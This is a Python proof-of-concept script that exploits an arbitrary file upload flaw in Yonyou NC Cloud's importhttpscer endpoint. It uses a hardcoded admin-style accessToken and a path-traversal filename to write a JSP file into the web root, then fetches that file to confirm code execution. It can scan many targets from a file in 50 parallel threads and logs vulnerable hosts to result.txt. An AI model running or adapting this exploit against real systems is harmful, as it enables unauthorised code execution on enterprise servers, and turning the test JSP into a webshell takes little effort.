# 用友NC Cloud importhttpscer接口任意文件上传漏洞
import argparse
from multiprocessing.dummy import Pool
import requests,json
import sys
requests.packages.urllib3.disable_warnings()
import time

#定义横幅


def banner():
    banner = """
██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                       
                                                author:watermelon_xz🍉
                                 version:用友NC Cloud importhttpscer接口任意文件上传漏洞
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="用友NC Cloud importhttpscer接口任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
        # if poc(args.url):
        #     exp(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = '/nccloud/mob/pfxx/manualload/importhttpscer'
    url = target+payload
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0 info',
        'Accept':'*/*',
        'Accept-Encoding':'gzip, deflate',
        'Connection':'close',
        'accessToken':'eyJhbGciOiJIUzUxMiJ9.eyJwa19ncm91cCI6IjAwMDE2QTEwMDAwMDAwMDAwSkI2IiwiZGF0YXNvdXJjZSI6IjEiLCJsYW5nQ29kZSI6InpoIiwidXNlclR5cGUiOiIxIiwidXNlcmlkIjoiMSIsInVzZXJDb2RlIjoiYWRtaW4ifQ.XBnY1J3bVuDMYIfPPJXb2QC0Pdv9oSvyyJ57AQnmj4jLMjxLDjGSIECv2ZjH9DW5T0JrDM6UHF932F5Je6AGxA',
        'Content-Type':'multipart/form-data; boundary=fd28cb44e829ed1c197ec3bc71748df0',
        'Content-Length':'291',  
         }
    data = (
        '--fd28cb44e829ed1c197ec3bc71748df0\r\n'
        'Content-Disposition: form-data; name="file"; filename="./webapps/nc_web/123.jsp"\r\n'
        'Content-Type: application/octet-stream\r\n'
        '\r\n'
        '<%out.print(123);%>\r\n'
        '--fd28cb44e829ed1c197ec3bc71748df0--\r\n'
    )
   
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    payload1 = '/123.jsp'
    url1 = target+payload1

    #请求网页
    try:
        re = requests.post(url=url,headers=headers,data=data,verify=False)
        # print(re.text)
        if re.status_code == 200 and '"code":"1000000000"' in re.text:
            # print(re.text)
            print(f'[+++]该{target}存在用友NC Cloud importhttpscer接口任意文件上传漏洞')
            re1= requests.get(url=url1)
            # print(re1.text)
            if re1.status_code==200 and '123' in re1.text:
                # print(re1.text)
                print(f'[+++]{target}存在任意文件上传漏洞,文件上传后地址为{url1}')
                with open('result.txt',mode='a',encoding='utf-8')as ft:
                    ft.write(target+'\n')
                return True 
        else:
            print(f'该{target}不存在该漏洞')
    except:
        print(f'该{target}存在问题，请手动测试')



if __name__ == '__main__':
    main()